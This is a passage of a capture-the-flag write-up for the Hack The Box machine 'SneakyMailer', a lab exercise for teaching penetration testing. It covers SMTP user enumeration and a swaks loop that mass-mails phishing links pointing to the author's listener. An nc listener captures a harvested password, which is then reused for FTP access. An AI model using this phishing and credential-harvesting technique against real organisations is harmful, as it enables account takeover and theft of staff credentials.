---
title: "SneakyMailer"
difficulty: Medium
os: Linux
points: 30
rating: 3.9
date: 2020-07-11
avatar: assets/htb/sneakymailer.png
tags: [Weak Credentials, Misconfiguration, Password Reuse, Password Cracking, SUDO Exploitation, Phishing, FTP, PyPi]
htb_url: https://app.hackthebox.com/machines/SneakyMailer
---
## Useful Skills and Tools

#### Save a transcript of any session \(even remote nc sessions!\)

* The `script $log_filename` command records the entire output of a session, stderr included, plus output from interactive programs like nano and vim! That's a lifesaver when you close a session and realize you never copied or backed something up. To end the transcript, type `exit` once you've left any shells you spawned during the session.

## Enumeration

### Nmap scan

I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default set of enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ nmap -n -v -sCV -p- <YOUR_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 16:59 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Initiating NSE at 16:59
Completed NSE at 16:59, 0.00s elapsed
Initiating Ping Scan at 16:59
Scanning <YOUR_IP> [2 ports]
Completed Ping Scan at 16:59, 0.05s elapsed (1 total hosts)
Initiating Connect Scan at 16:59
Scanning <YOUR_IP> [65535 ports]
Discovered open port 22/tcp on <YOUR_IP>
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 993/tcp on <YOUR_IP>
Discovered open port 25/tcp on <YOUR_IP>
Discovered open port 21/tcp on <YOUR_IP>
Discovered open port 8080/tcp on <YOUR_IP>
Discovered open port 143/tcp on <YOUR_IP>
Completed Connect Scan at 17:00, 29.26s elapsed (65535 total ports)
Initiating Service scan at 17:00
Scanning 7 services on <YOUR_IP>
Completed Service scan at 17:00, 10.12s elapsed (7 services on 1 host)
NSE: Script scanning <YOUR_IP>.
Initiating NSE at 17:00
Completed NSE at 17:00, 13.18s elapsed
Initiating NSE at 17:00
Completed NSE at 17:01, 28.39s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.078s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 STARTTLS OK IDLE THREAD=ORDEREDSUBJECT SORT ACL QUOTA UIDPLUS UTF8=ACCEPTA0001 NAMESPACE completed THREAD=REFERENCES CHILDREN CAPABILITY ENABLE ACL2=UNION
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 OK IDLE THREAD=ORDEREDSUBJECT SORT ACL QUOTA UIDPLUS UTF8=ACCEPTA0001 NAMESPACE completed AUTH=PLAIN THREAD=REFERENCES CHILDREN CAPABILITY ENABLE ACL2=UNION
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.28 seconds
```

21,22,25,80,143,993,8080 open

### Port 21 - FTP

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ ftp <YOUR_IP>
Connected to <YOUR_IP>.
220 (vsFTPd 3.0.3)
Name (<YOUR_IP>:kac0): anonymous
530 Permission denied.
Login failed.
ftp> exit
221 Goodbye.
```

My first move was an anonymous FTP login, which the server refused.

### Port 80 - HTTP

port 80 redirected me to [http://sneakycorp.htb/](http://sneakycorp.htb/), so I added the hostname to /etc/hosts

![](assets/wu/sneakymailer/img-1.png)

With the domain name now in /etc/hosts

![](assets/wu/sneakymailer/img-2.png)

The messages pop-up gave me the names Cara Stevens and Bradley Greer. Names like these can be turned into candidate usernames by applying typical corporate naming conventions.

![](assets/wu/sneakymailer/img-3.png)

I also dug through the page source looking for message content that wasn't visible in the previews, and learned that Bradley Greer was my 'personal tester' while Cara Stevens owned the company. Both looked like worthwhile targets.

![](assets/wu/sneakymailer/img-4.png)

The `/team.php` page listed out the company's employees.  

```text
Name    Position    Office    Email
Airi Satou     Accountant     Tokyo     airisatou@sneakymailer.htb
Angelica Ramos     Chief Executive Officer (CEO)     London     angelicaramos@sneakymailer.htb
Ashton Cox     Junior Technical Author     San Francisco     ashtoncox@sneakymailer.htb
Bradley Greer     Tester     London     bradleygreer@sneakymailer.htb
Brenden Wagner     Software Engineer     San Francisco     brendenwagner@sneakymailer.htb
Brielle Williamson     Tester     New York     briellewilliamson@sneakymailer.htb
Bruno Nash     Software Engineer     London     brunonash@sneakymailer.htb
Caesar Vance     Tester     New York     caesarvance@sneakymailer.htb
Cara Stevens     Sales Assistant     New York     carastevens@sneakymailer.htb
Cedric Kelly     Senior Javascript Developer     Edinburgh     cedrickelly@sneakymailer.htb
Charde Marshall     Tester     San Francisco     chardemarshall@sneakymailer.htb
Colleen Hurst     Javascript Developer     San Francisco     colleenhurst@sneakymailer.htb
Dai Rios     Personnel Lead     Edinburgh     dairios@sneakymailer.htb
Donna Snider     Customer Support     New York     donnasnider@sneakymailer.htb
Doris Wilder     Sales Assistant     Sidney     doriswilder@sneakymailer.htb
Finn Camacho     Support Engineer     San Francisco     finncamacho@sneakymailer.htb
Fiona Green     Tester     San Francisco     fionagreen@sneakymailer.htb
Garrett Winters     Accountant     Tokyo     garrettwinters@sneakymailer.htb
Gavin Cortez     Team Leader     San Francisco     gavincortez@sneakymailer.htb
Gavin Joyce     Developer     Edinburgh     gavinjoyce@sneakymailer.htb
Gloria Little     Systems Administrator     New York     glorialittle@sneakymailer.htb
Haley Kennedy     Tester     London     haleykennedy@sneakymailer.htb
Hermione Butler     Regional Director     London     hermionebutler@sneakymailer.htb
Herrod Chandler     Tester     San Francisco     herrodchandler@sneakymailer.htb
Hope Fuentes     Secretary     San Francisco     hopefuentes@sneakymailer.htb
Howard Hatfield     Office Manager     San Francisco     howardhatfield@sneakymailer.htb
Jackson Bradshaw     Director     New York     jacksonbradshaw@sneakymailer.htb
Jena Gaines     Office Manager     London     jenagaines@sneakymailer.htb
Jenette Caldwell     Development Lead     New York     jenettecaldwell@sneakymailer.htb
Jennifer Acosta     Junior Javascript Developer     Edinburgh     jenniferacosta@sneakymailer.htb
Jennifer Chang     Regional Director     Singapore     jenniferchang@sneakymailer.htb
Jonas Alexander     Developer     San Francisco     jonasalexander@sneakymailer.htb
Lael Greer     Systems Administrator     London     laelgreer@sneakymailer.htb
Martena Mccray     Post-Sales support     Edinburgh     martenamccray@sneakymailer.htb
Michael Silva     Marketing Designer     London     michaelsilva@sneakymailer.htb
Michelle House     Integration Specialist     Sidney     michellehouse@sneakymailer.htb
Olivia Liang     Support Engineer     Singapore     olivialiang@sneakymailer.htb
Paul Byrd     Tester     New York     paulbyrd@sneakymailer.htb
Prescott Bartlett     Technical Author     London     prescottbartlett@sneakymailer.htb
Quinn Flynn     Support Lead     Edinburgh     quinnflynn@sneakymailer.htb
Rhona Davidson     Integration Specialist     Tokyo     rhonadavidson@sneakymailer.htb
Sakura Yamamoto     Support Engineer     Tokyo     sakurayamamoto@sneakymailer.htb
Serge Baldwin     Data Coordinator     Singapore     sergebaldwin@sneakymailer.htb
Shad Decker     Regional Director     Edinburgh     shaddecker@sneakymailer.htb
Shou Itou     Regional Marketing     Tokyo     shouitou@sneakymailer.htb
Sonya Frost     Tester     Edinburgh     sonyafrost@sneakymailer.htb
Suki Burks     Developer     London     sukiburks@sneakymailer.htb
sulcud     The new guy     Freelance     sulcud@sneakymailer.htb
Tatyana Fitzpatrick     Regional Director     London     tatyanafitzpatrick@sneakymailer.htb
Thor Walton     Developer     New York     thorwalton@sneakymailer.htb
Tiger Nixon     System Architect     Edinburgh     tigernixon@sneakymailer.htb
Timothy Mooney     Office Manager     London     timothymooney@sneakymailer.htb
Unity Butler     Marketing Designer     San Francisco     unitybutler@sneakymailer.htb
Vivian Harrell     Financial Controller     San Francisco     vivianharrell@sneakymailer.htb
Yuri Berry     Chief Marketing Officer (CMO)     New York     yuriberry@sneakymailer.htb
Zenaida Frank     Software Engineer     New York     zenaidafrank@sneakymailer.htb
Zorita Serrano     Software Engineer     San Francisco     zoritaserrano@sneakymailer.htb
```

It was a long roster of employees. I saved the usernames and emails into lists to use later on

I later discovered a handy tool that pulls email addresses straight out of a page: [https://email-checker.net/extract](https://email-checker.net/extract)

![](assets/wu/sneakymailer/img-5.png)

The page source also referenced a registration page located at `/pypi/register.php`.  

![](assets/wu/sneakymailer/img-6.png)

Dirbuster picked up this page a little later too, but there wasn't much else worth examining.

![](assets/wu/sneakymailer/img-7.png)

I browsed to that registration page and attempted to sign up an account, but it didn't appear to actually work.

Entering pypi.sneakycorp.htb just bounced me to the main page, so I fired up ffuf to hunt for additional virtual hosts

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.sneakycorp.htb/ -c                     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.sneakycorp.htb/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
```

![](assets/wu/sneakymailer/img-8.png)

dev.sneakycorp.htb served up a site nearly identical to the main one, except the registration page was linked here. 

![](assets/wu/sneakymailer/img-9.png)

Attempted to register once more

### Port 8080 - HTTP

![](assets/wu/sneakymailer/img-10.png)

I decided to poke at port 8080 across each virtual host; dev was a dead end

![](assets/wu/sneakymailer/img-11.png)

, but pypi paid off: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)

![](assets/wu/sneakymailer/img-12.png)

it was running pypiserver 1.3.2, while the current release was 1.4.2

![](assets/wu/sneakymailer/img-13.png)

[https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)

### Port 25 - SMTP

#### Verifying valid email addresses

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ telnet sneakycorp.htb 25                                                                        1 ⨯
Trying <YOUR_IP>...
Connected to sneakycorp.htb.
Escape character is '^]'.
HELO
220 debian ESMTP Postfix (Debian/GNU)
501 Syntax: HELO hostname
HELO sneakycorp.htb
250 debian
MAIL FROM:kac0@sneakycorp.htb
250 2.1.0 Ok
RCPT TO:bradleygreer@sneakymailer.htb
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
This is a test!    

.
250 2.0.0 Ok: queued as 155A82467F
VRFY root
252 2.0.0 root
vrfy test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
VRFY bradleygreer@sneakymailer.htb
252 2.0.0 bradleygreer@sneakymailer.htb
VRFY carastevens@sneakymailer.htb
252 2.0.0 carastevens@sneakymailer.htb
VRFY airisatou@sneakymailer.htb
252 2.0.0 airisatou@sneakymailer.htb
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) I fired off a message to my personal tester greer-san... and after checking a handful of addresses, they all came back as valid

```text
msf5 exploit(multi/handler) > use smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility

[*] Using auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS     <YOUR_IP>                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf5 auxiliary(scanner/smtp/smtp_enum) > set rhosts <YOUR_IP>
rhosts => <YOUR_IP>
msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] <YOUR_IP>:25       - <YOUR_IP>:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
[+] <YOUR_IP>:25       - <YOUR_IP>:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, www-data
[*] <YOUR_IP>:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users
USER_FILE => users
msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] <YOUR_IP>:25       - <YOUR_IP>:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
[+] <YOUR_IP>:25       - <YOUR_IP>:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb
[*] <YOUR_IP>:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

confirmed every one of the usernames

### Sending a phishing email with SMTP

Looked up how to drive SMTP from the command line - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
--to $address --from kac0@sneakymailer.htb --header "Subject: Check this out" \
--body "Check this out! http://10.10.15.100:8090/" --server <YOUR_IP>; done
  
=== Trying <YOUR_IP>:25...
=== Connected to <YOUR_IP>.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO sneakycorp.htb
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<kac0@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<airisatou@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 08 Nov 2020 21:03:55 -0500
 -> To: airisatou@sneakymailer.htb
 -> From: kac0@sneakymailer.htb
 -> Subject: Check this out
 -> Message-Id: <20201108210355.081776@kali.kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Check this out! http://10.10.15.100:8090/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as B850724954
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
=== Trying <YOUR_IP>:25...
=== Connected to <YOUR_IP>.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO sneakycorp.htb
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<kac0@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<angelicaramos@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 08 Nov 2020 21:04:05 -0500
 -> To: angelicaramos@sneakymailer.htb
 -> From: kac0@sneakymailer.htb
 -> Subject: Check this out
 -> Message-Id: <20201108210405.081780@kali.kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Check this out! http://10.10.15.100:8090/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 3A9A124956
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

got no reply, so I figured I'd try a working local address. I also moved the "link" onto its own line in case some script couldn't parse it for whatever reason \(maybe the `!`?\)

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
--to $address --from root@sneakymailer.htb --header "Subject: Check this out" \
--body "Check this out. \nhttp://10.10.15.100:8090/" --server <YOUR_IP>; done 

=== Trying <YOUR_IP>:25...
=== Connected to <YOUR_IP>.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO sneakycorp.htb
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<root@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<airisatou@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sun, 08 Nov 2020 21:22:30 -0500
 -> To: airisatou@sneakymailer.htb
 -> From: root@sneakymailer.htb
 -> Subject: Check this out
 -> Message-Id: <20201108212230.082099@kali.kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Check this out! 
 -> http://10.10.15.100:8090/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 5A9CF249C9
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

...snipped...

=== Trying <YOUR_IP>:25...
=== Connected to <YOUR_IP>.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO sneakycorp.htb
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<root@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<zenaidafrank@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 11 Nov 2020 11:19:46 -0500
 -> To: zenaidafrank@sneakymailer.htb
 -> From: root@sneakymailer.htb
 -> Subject: Check this out
 -> Message-Id: <20201111111946.150282@kali.kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Check this out 
 -> http://10.10.14.174:8090/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as C831324848
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
=== Trying <YOUR_IP>:25...
=== Connected to <YOUR_IP>.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO sneakycorp.htb
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<root@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<zoritaserrano@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 11 Nov 2020 11:19:57 -0500
 -> To: zoritaserrano@sneakymailer.htb
 -> From: root@sneakymailer.htb
 -> Subject: Check this out
 -> Message-Id: <20201111111957.150283@kali.kali>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Check this out 
 -> http://10.10.14.174:8090/
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 408FC2484A
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

since the phishing emails weren't getting any replies, I'm going to reset the box, and also strip the `!` from the body to rule that out as the problem

![](assets/wu/sneakymailer/img-14.png)

I'd been running a packet capture throughout to watch whether my messages were going out and coming back, and eventually one of them produced a reply

![](assets/wu/sneakymailer/img-15.png)

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ nc -lvnp 8090                                                                                  1 ⨯
listening on [any] 8090 ...
connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 51434
POST / HTTP/1.1
Host: 10.10.14.174:8090
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

Got a bite! Paul Byrd followed my link and handed over a \(URL-encoded\) password in the process.

```text
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

Decoding it yielded this \(extremely convoluted\) password:

```text
^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

### Reading Paul's mail

With Paul having handed over his email password, I logged into his mailbox to see what I could turn up

![](assets/wu/sneakymailer/img-16.png)

I entered Paul's account details into my email client and aimed the server settings at the target.

![](assets/wu/sneakymailer/img-17.png)

Once inside the mailbox the inbox was empty \(likely cleared on a schedule so players don't trip over each other's phishing links\). The `Sent items` folder did contain two messages, though. The first was sent to the administrator `root@debian` requesting a password change for the `developer` account, and it conveniently included the old password `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`. I jotted it down in case it was reused somewhere, or in case the admin hadn't rotated it yet.

![](assets/wu/sneakymailer/img-18.png)

The second message went to `low`, which struck me as another likely username on the box. It described a task to "install, test, and then erase" every module in the PyPI service. My hope was that Paul had automated this with a script, and that I could trick it into running a module I managed to get uploaded to the service.

```text
Hello administrator, I want to change this password for the developer account

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C 

Please notify me when you do it
```

Now that I had credentials, my best guess was that they'd work against the PyPI server I'd found earlier.  

![](assets/wu/sneakymailer/fix-22.png)

no packages present

![](assets/wu/sneakymailer/fix-23.png)

and nothing on the index page either

That didn't pan out, and neither did SSH. I went back to my nmap results to look for other services to try, spotted that port 21 - FTP was open, and gave it a shot.

### FTP Enumeration

```text
┌──(kac0㉿kali)-[~/htb/sneakymailer]
└─$ ftp <YOUR_IP>                                                                              255 ⨯
Connected to <YOUR_IP>.
220 (vsFTPd 3.0.3)
Name (<YOUR_IP>:kac0): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

The `delevoper` account credentials I'd recovered let me log straight into FTP.

```text
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Nov 11 09:16 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 18:52 css
drwxr-xr-x    2 0        0            4096 May 26 18:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 18:52 js
drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
226 Directory send OK.
ftp> get team.php
local: team.php remote: team.php
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for team.php (26523 bytes).
226 Transfer complete.
26523 bytes received in 0.05 secs (557.8464 kB/s)
ftp> cd pypi
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            3115 May 26 18:52 register.php
226 Directory send OK.
ftp> get register.php
local: register.php remote: register.php
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for register.php (3115 bytes).
226 Transfer complete.
3115 bytes received in 0.00 secs (52.1175 MB/s)
ftp> cd ../vendor
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 May 26 18:52 bootstrap
drwxr-xr-x    2 0        0            4096 May 26 18:52 chart.js
drwxr-xr-x    2 0        0            4096 May 26 18:52 datatables
